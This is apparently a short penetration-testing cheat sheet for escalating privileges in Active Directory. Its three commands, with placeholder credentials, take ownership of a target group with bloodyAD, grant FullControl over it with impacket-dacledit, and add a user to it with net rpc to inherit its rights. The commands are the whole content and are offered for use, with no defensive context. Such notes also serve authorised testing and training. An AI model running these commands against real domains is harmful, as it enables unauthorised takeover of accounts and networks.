Become owner of target group:
```
bloodyAD --host '<ip>' -d '<domain>' -u '<username>' -p '<password>' set owner '<targetGroup>' '<currentGroup>'
```

Get full control of target group:
```
impacket-dacledit -action 'write' -rights 'FullControl' -principal '<owned>' -target '<target>' '<domain>'/'<username>':'<password>'
```

Become member of target group to inherit groups perms:
```
net rpc group addmem "<group>" "<userToAdd>" -U "<domain>"/"<userWithPerm>"%"<password>" -S "<dc ip>"
```

